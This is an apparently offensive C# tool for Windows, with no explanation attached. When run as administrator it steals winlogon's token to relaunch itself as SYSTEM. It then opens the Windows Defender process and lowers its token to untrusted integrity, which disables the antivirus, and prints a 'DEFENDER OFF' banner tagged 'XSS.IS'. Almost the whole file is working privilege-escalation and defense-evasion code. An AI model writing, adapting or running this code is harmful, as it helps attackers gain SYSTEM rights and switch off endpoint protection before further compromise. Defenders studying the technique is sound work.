using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace ABC
{
    class Program
    {
        static void Main(string[] args)
        {
            
            Console.WriteLine("Admin privelegies: " + IsAdministrator().ToString().ToUpper());
            string owner = GetProcessOwner(Process.GetCurrentProcess().Id);
            Console.WriteLine("User: " + owner);

            if (IsAdministrator() && owner.StartsWith("NT") == false)
            {
                Console.WriteLine("Starting Elevating to SYSTEM");
                jumptoSys();
            }
            else if (IsAdministrator() && owner.StartsWith("NT"))
            {
                Console.WriteLine("Starting WD Disable");
                Disable();
            }

            Console.ReadLine();
        }

        public static void jumptoSys()
        {
            string procTostart = Assembly.GetEntryAssembly().Location;
            Process process = Process.GetProcessesByName("winlogon")[0];
            IntPtr procHandle = process.Handle;
            IntPtr tokenHandle = IntPtr.Zero;

            WinApi.OpenProcessToken(procHandle, 0x0002, out tokenHandle);

            WinApi.STARTUPINFO SINFO = new WinApi.STARTUPINFO();
            SINFO.dwFlags = 1;
            SINFO.wShowWindow = 1;

            WinApi.PROCESS_INFORMATION PINFO;

            WinApi.SECURITY_ATTRIBUTES SECA = new WinApi.SECURITY_ATTRIBUTES();

            IntPtr doubleDuplicateToken = IntPtr.Zero;

            WinApi.DuplicateTokenEx(tokenHandle, 0x2000000, ref SECA, 2, WinApi.TOKEN_TYPE.TokenPrimary, out doubleDuplicateToken); 

            WinApi.CreateProcessWithTokenW(doubleDuplicateToken, WinApi.LogonFlags.NetCredentialsOnly, null, procTostart, WinApi.CreationFlags.DefaultErrorMode, IntPtr.Zero, null, ref SINFO, out PINFO);
        }

        public static void Disable()
        {
            int pid = Process.GetProcessesByName("MsMpEng")[0].Id;

            IntPtr handleWD = WinApi.OpenProcess(WinApi.ProcessAccessFlags.QueryLimitedInformation, false, pid);

            IntPtr currentToken;
            WinApi.OpenProcessToken(handleWD, (uint)WinApi.TokenAccessFlags.TOKEN_ALL_ACCESS, out currentToken);

            WinApi.TOKEN_MANDATORY_LABEL tml = default;
            tml.Label.Sid = IntPtr.Zero;
            tml.Label.Attributes = 0x20; // SE_GROUP_INTEGRITY
            WinApi.ConvertStringSidToSid("S-1-16-0", out tml.Label.Sid);

            IntPtr tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tml));
            Marshal.StructureToPtr(tml, tmlPtr, false);

            WinApi.SetTokenInformation(currentToken, WinApi.TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, tmlPtr, (uint)Marshal.SizeOf(tml));

            Console.WriteLine(@"
██████╗░███████╗███████╗███████╗███╗░░██╗██████╗░███████╗██████╗░    ░█████╗░███████╗███████╗
██╔══██╗██╔════╝██╔════╝██╔════╝████╗░██║██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝
██║░░██║█████╗░░█████╗░░█████╗░░██╔██╗██║██║░░██║█████╗░░██████╔╝    ██║░░██║█████╗░░█████╗░░
██║░░██║██╔══╝░░██╔══╝░░██╔══╝░░██║╚████║██║░░██║██╔══╝░░██╔══██╗    ██║░░██║██╔══╝░░██╔══╝░░
██████╔╝███████╗██║░░░░░███████╗██║░╚███║██████╔╝███████╗██║░░██║    ╚█████╔╝██║░░░░░██║░░░░░
╚═════╝░╚══════╝╚═╝░░░░░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝    ░╚════╝░╚═╝░░░░░╚═╝░░░░░


██╗░░██╗░██████╗░██████╗░░░██╗░██████╗
╚██╗██╔╝██╔════╝██╔════╝░░░██║██╔════╝
░╚███╔╝░╚█████╗░╚█████╗░░░░██║╚█████╗░
░██╔██╗░░╚═══██╗░╚═══██╗░░░██║░╚═══██╗
██╔╝╚██╗██████╔╝██████╔╝██╗██║██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝╚═╝╚═════╝░");

        }

        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                    .IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static string GetProcessOwner(int processId)
        {
            string query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection processList = searcher.Get();

            foreach (ManagementObject obj in processList)
            {
                string[] argList = new string[] { string.Empty, string.Empty };
                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
                if (returnVal == 0)
                {
                    return argList[1] + @"\" + argList[0];
                }
            }

            return "NO OWNER";
        }
    }
}
